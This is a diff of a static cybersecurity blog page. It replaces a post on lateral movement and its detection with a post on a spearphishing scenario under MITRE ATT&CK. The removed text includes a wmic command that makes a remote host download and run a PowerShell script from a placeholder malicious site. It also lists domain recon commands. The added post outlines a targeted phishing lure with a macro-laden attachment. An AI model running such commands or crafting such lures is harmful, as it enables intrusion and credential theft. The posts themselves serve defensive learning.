@@ -5,16 +5,9 @@
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="robots" content="noindex, nofollow">
-<title>Lateral Movement | jhead.blog</title>
-<meta name="keywords" content="malware, strategy, cybersecurity">
-<meta name="description" content="Once a hacker has gained access to a system through their path of choice, the next usual step is to try and gain access to other—usually more high-profile machines on the network. This process is known as lateral movement, and it can be done in a variety of ways. To be more specific about why hackers do this, let’s talk about the advantages of gaining access to other machines.
-Why?
-
-Gain access to more privileged accounts
-Reach valuable data (like on a file server)
-Spread persistence across the network (creating re-entry points or backdoors)
-
-Having skill in lateral movement is arguably one of the most important things for a hacker. It’s their ability to move through the environment once they get in, and it must be done with precision and stealth. It’s also where many attackers get caught, since they can leave plenty of breadcrumbs along the way.">
+<title>Initial Access: Spearphishing Example | jhead.blog</title>
+<meta name="keywords" content="phishing, initial access, cybersecurity, MITRE">
+<meta name="description" content="In the MITRE ATT&amp;CK Framework, which classifies and creates chains of events for certain kinds of hacker behavior, Initial Access is one of the first tactics used in an attack. It’s sort of self-explanatory—it describes how the attacker first got into a system. I’m just learning about these concepts, so I wanted to start from the beginning. I’m interested in a few techniques, and I’ll go over them in my next few posts.">
 <meta name="author" content="Jared Head">
 <link rel="canonical" href="http://localhost:1313/posts/lateral-movement/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.6da9a63d25a9608bca2f7f907a030e887a7dd3c3f3918e4cc113129361414bda.css" integrity="sha256-bammPSWpYIvKL3&#43;QegMOiHp908PzkY5MwRMSk2FBS9o=" rel="preload stylesheet" as="style">
@@ -93,79 +86,63 @@ Having skill in lateral movement is arguably one of the most important things fo
   <header class="post-header">
     <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/posts/">Posts</a></div>
     <h1 class="post-title entry-hint-parent">
-      Lateral Movement
+      Initial Access: Spearphishing Example
     </h1>
-    <div class="post-meta"><span title='2025-05-02 00:00:00 +0000 UTC'>2025-05-02</span>&nbsp;·&nbsp;3 min&nbsp;·&nbsp;Jared Head
+    <div class="post-meta"><span title='2025-05-04 00:00:00 +0000 UTC'>2025-05-04</span>&nbsp;·&nbsp;3 min&nbsp;·&nbsp;Jared Head
 
 </div>
   </header> 
-  <div class="post-content"><p>Once a hacker has gained access to a system through their path of choice, the next usual step is to try and gain access to other—usually more high-profile machines on the network. This process is known as <strong>lateral movement</strong>, and it can be done in a variety of ways. To be more specific about <em>why</em> hackers do this, let’s talk about the advantages of gaining access to other machines.</p>
-<h3 id="why">Why?<a hidden class="anchor" aria-hidden="true" href="#why">#</a></h3>
+  <div class="post-content"><p>In the MITRE ATT&amp;CK Framework, which classifies and creates chains of events for certain kinds of hacker behavior, Initial Access is one of the first tactics used in an attack. It’s sort of self-explanatory—it describes how the attacker first got into a system. I’m just learning about these concepts, so I wanted to start from the beginning. I’m interested in a few techniques, and I’ll go over them in my next few posts.</p>
+<p>Something we’ve all heard of and are familiar with is <strong>Phishing (T1566)</strong>, so I wanted to look deeper into the different methods behind this tactic—specifically, <strong>Spearphishing</strong>. Spearphishing differs from general phishing in that it is targeted. A hacker will meticulously look into a target—usually an individual with privileged accounts or status—and develop a handcrafted phishing email for them.</p>
+<h3 id="spearphishing-example">Spearphishing Example<a hidden class="anchor" aria-hidden="true" href="#spearphishing-example">#</a></h3>
+<p>Samantha is a Senior Compliance Officer at a mid-sized financial firm.<br>
+She frequently appears in LinkedIn posts about regulatory updates and has recently spoken on a panel about SEC reporting standards.</p>
+<p>An attacker—posing as a recruiter from a reputable consulting firm—sends her an email:</p>
+<blockquote>
+<p><strong>Subject:</strong> Invitation to Speak at SEC2025 Regulatory Trends Panel – Confirm Availability?</p></blockquote>
 <ul>
-<li>Gain access to more privileged accounts</li>
-<li>Reach valuable data (like on a file server)</li>
-<li>Spread persistence across the network (creating re-entry points or backdoors)</li>
+<li>References real names from the previous year’s panel</li>
+<li>Includes a customized invitation letter as a PDF</li>
+<li>Attaches a malicious Excel file (<code>Panel_Schedule_2025.xlsm</code>) that “requires macros to view timeslots”</li>
 </ul>
-<p>Having skill in lateral movement is arguably one of the most important things for a hacker. It’s their ability to <em>move</em> through the environment once they get in, and it must be done with precision and stealth. It’s also where many attackers get caught, since they can leave plenty of breadcrumbs along the way.</p>
-<p>Sometimes they’ll just get into a system and monitor common processes and behaviors for a while. This helps them build a plan for how best to navigate the network undetected. Usually, they’ll use techniques like LotL (Living off the Land)—<a href="../living-off-the-land-attack/">which I wrote about here</a>—to stay hidden.</p>
-<h3 id="how">How?<a hidden class="anchor" aria-hidden="true" href="#how">#</a></h3>
-<p>Hackers usually use LOLBins to evade detection. Some of the tools are as follows:</p>
+<h3 id="what-happens">What Happens<a hidden class="anchor" aria-hidden="true" href="#what-happens">#</a></h3>
+<p>When Samantha opens the Excel file and enables macros, a PowerShell script is executed. This script could do a variety of things, but let’s say it does the following:</p>
+<ol>
+<li>
+<p><strong>Establishes a C2 connection to a domain hidden behind FastFlux DNS</strong></p>
 <ul>
-<li>
-<p><strong>PsExec</strong><br>
-A remote command execution tool in SysInternals. Often used to run or spawn shells on other machines.</p>
-</li>
-<li>
-<p><strong>WMI (<code>wmic</code>)</strong><br>
-Used to query remote systems or start processes across the network.</p>
-</li>
-<li>
-<p><strong>RDP</strong><br>
-Used to log in like a real user, assuming credentials have been found or stolen.</p>
-</li>
-<li>
-<p><strong>WinRM</strong><br>
-Remote PowerShell execution used in enterprise environments.</p>
-</li>
+<li>This is the malware &ldquo;phoning home&rdquo; to get instructions or download further tools.</li>
+<li>FastFlux allows the attacker to rapidly change the IP addresses associated with the domain, making it harder to block or take down.</li>
 </ul>
-<h3 id="detection">Detection<a hidden class="anchor" aria-hidden="true" href="#detection">#</a></h3>
-<p>Detecting lateral movement is tricky because it uses legitimate, trusted tools and real credentials. However, defenders can look for patterns that suggest something suspicious is happening under the surface.</p>
-<hr>
-<h4 id="1-unusual-parent-child-process-relationships">1. Unusual Parent-Child Process Relationships<a hidden class="anchor" aria-hidden="true" href="#1-unusual-parent-child-process-relationships">#</a></h4>
-<p>When a hacker is on a machine, they may be using LOLBins, but the <strong>way</strong> those tools are used can give them away. One way defenders detect this is by looking at <strong>which process started another</strong>—also known as parent-child process relationships.</p>
-<p>Let’s say we see this process chain in a system:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>winword.exe → cmd.exe → powershell.exe → wmic.exe
-</span></span></code></pre></div><ul>
-<li><code>winword.exe → cmd.exe</code> implies there was likely a macro embedded in a Word document (probably from a phishing email).</li>
-<li>That macro launches <code>cmd.exe</code>, which runs <code>powershell.exe</code>.</li>
-<li>PowerShell can then download a payload, and finally <code>wmic.exe</code> is used for the <strong>lateral movement</strong>.</li>
-</ul>
-<p>Here’s an example command that might be executed via <code>wmic.exe</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wmic /node:<span style="color:#e6db74">&#34;10.0.0.12&#34;</span> process call create <span style="color:#e6db74">&#34;powershell -NoP -W Hidden -C IEX(New-Object Net.WebClient).DownloadString(&#39;http://malicious.site/payload.ps1&#39;)&#34;</span>
-</span></span></code></pre></div><ul>
-<li><code>/node:&quot;10.0.0.12&quot;</code> → Targets another machine on the network.</li>
-<li><code>process call create</code> → Asks that machine to run a new process.</li>
-<li><code>&quot;powershell -NoP -W Hidden -C IEX(...)&quot;</code> → Starts a hidden PowerShell instance that:
+</li>
+<li>
+<p><strong>Drops an info-stealer</strong></p>
 <ul>
-<li><code>-NoP</code>: No profile (faster, stealthier)</li>
-<li><code>-W Hidden</code>: Hides the PowerShell window</li>
-<li><code>IEX(...)</code>: Downloads and runs a malicious PowerShell script in memory</li>
+<li>This malware reads sensitive data from the browser, including stored usernames, passwords, and cookies.</li>
 </ul>
 </li>
+<li>
+<p><strong>Uses <code>regsvr32</code> to bypass antivirus</strong></p>
+<ul>
+<li>A Living-off-the-Land (LotL) technique using a legitimate Windows utility to register and execute malicious DLLs.</li>
+<li>Since the payload doesn’t write to disk, it avoids traditional AV detection.</li>
 </ul>
-<hr>
-<h4 id="2-new-or-rare-use-of-lateral-tools">2. New or Rare Use of Lateral Tools<a hidden class="anchor" aria-hidden="true" href="#2-new-or-rare-use-of-lateral-tools">#</a></h4>
-<p>Tools like <code>PsExec</code>, <code>wmic</code>, <code>winrm</code>, and PowerShell remoting are normally used by system admins—but only in certain environments and contexts. Defenders might set up alerts for their use in unexpected locations, or flag activity that doesn’t match the usual user behavior. Sudden or anomalous use of these tools is a red flag that lateral movement could be underway.</p>
-<hr>
-<h4 id="3-login-anomalies">3. Login Anomalies<a hidden class="anchor" aria-hidden="true" href="#3-login-anomalies">#</a></h4>
-<p>Things like <strong>multiple login attempts</strong>, <strong>a low-privilege user suddenly logging into many machines</strong>, or <strong>remote logins at odd hours</strong> (e.g., an HR employee remoting in at 3 AM) are classic indicators of lateral movement.</p>
-<hr>
-<h4 id="4-suspicious-recon-activity">4. Suspicious Recon Activity<a hidden class="anchor" aria-hidden="true" href="#4-suspicious-recon-activity">#</a></h4>
-<p>These commands are often used to <strong>map the network</strong> and <strong>identify valuable targets</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>net view /domain
-</span></span><span style="display:flex;"><span>net use
-</span></span><span style="display:flex;"><span>net group <span style="color:#e6db74">&#34;Domain Admins&#34;</span> /domain
-</span></span></code></pre></div><p>They aren’t commands a normal user would ever run, and they often precede lateral movement.</p>
+</li>
+<li>
+<p><strong>Attempts lateral movement using SMB and harvested credentials</strong></p>
+<ul>
+<li>If the attacker has valid credentials, they can access shared drives, copy malware to new machines, or begin mapping the internal network.</li>
+</ul>
+</li>
+</ol>
+<h3 id="how-the-attacker-prepped">How the Attacker Prepped<a hidden class="anchor" aria-hidden="true" href="#how-the-attacker-prepped">#</a></h3>
+<p>The attacker used open-source intelligence (OSINT) to build a believable lure:</p>
+<ul>
+<li>Scraped Samantha’s LinkedIn profile for her role, interests, and speaking engagements</li>
+<li>Found her company’s quarterly schedule via a press release</li>
+<li>Knew her team uses Microsoft 365</li>
+<li>Referenced a real regulation (e.g., SEC Rule 10b-5) to appeal to her expertise and make the email feel legitimate</li>
+</ul>
 <hr>
 
 
@@ -173,9 +150,10 @@ Remote PowerShell execution used in enterprise environments.</p>
 
   <footer class="post-footer">
     <ul class="post-tags">
-      <li><a href="http://localhost:1313/tags/malware/">Malware</a></li>
-      <li><a href="http://localhost:1313/tags/strategy/">Strategy</a></li>
+      <li><a href="http://localhost:1313/tags/phishing/">Phishing</a></li>
+      <li><a href="http://localhost:1313/tags/initial-access/">Initial Access</a></li>
       <li><a href="http://localhost:1313/tags/cybersecurity/">Cybersecurity</a></li>
+      <li><a href="http://localhost:1313/tags/mitre/">MITRE</a></li>
     </ul>
 <nav class="paginav">
   <a class="prev" href="http://localhost:1313/posts/living-off-the-land-attack/">
